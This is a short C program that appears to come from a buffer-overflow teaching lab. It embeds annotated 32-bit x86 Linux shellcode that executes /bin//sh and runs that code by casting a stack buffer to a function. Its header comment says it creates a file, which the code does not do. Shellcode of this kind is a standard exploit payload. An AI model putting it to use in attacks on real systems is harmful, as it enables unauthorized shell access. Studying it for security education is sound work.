/* call_shellcode.c */

/* a program that creates a file containing code for launching shell */
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

/* machine code for launching terminal or shell */
const char code[] =
  "\x31\xc0"    /* xorl  %eax, %eax  */
  "\x50"        /* pushl %eax        */
  "\x68""//sh"  /* pushl $0x68732f2f */
  "\x68""/bin"  /* pushl $0x6e69622f */
  "\x89\xe3"    /* movl  %esp, %ebx  */
  "\x50"        /* pushl %eax        */
  "\x53"        /* pushl %ebx        */
  "\x89\xe1"    /* movl  %esp, %ecx  */
  "\x99"        /* cdq               */
  "\xb0\x0b"    /* movb  $0x0b, %al  */
  "\xcd\x80"    /* int   $0x80       */
;

int main(int argc, char **argv) {
   char buffer[sizeof(code)];
   strcpy(buffer, code);

   /* calling function to execute machine code copied in buffer */
   ((void(*)( ))buffer)();
} 
